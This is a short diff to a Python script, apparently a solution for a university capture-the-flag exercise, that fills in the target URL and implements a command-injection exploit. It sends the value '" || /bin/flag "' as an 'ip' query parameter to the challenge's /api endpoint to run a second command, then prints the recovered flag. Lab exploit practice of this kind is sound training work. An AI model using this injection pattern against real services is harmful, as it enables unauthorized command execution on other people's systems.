@@ -1,7 +1,7 @@
 import re
 import requests
 
-URL = "{{CHALLENGE_URL}}"
+URL = "https://t07-9135c81f3c0bc685.itsec.sec.in.tum.de/"
 
 # Returns only the flag if there is one in the passed string, otherwise returns None
 def extract_flag_from_string(string):
@@ -12,5 +12,6 @@ def extract_flag_from_string(string):
     return None
 
 with requests.Session() as sess:
-    # TODO implement exploit
-    pass
+    cmd = '" || /bin/flag "'
+    response = sess.get(URL + "/api", params={"ip": cmd})
+    print(extract_flag_from_string(response.text))
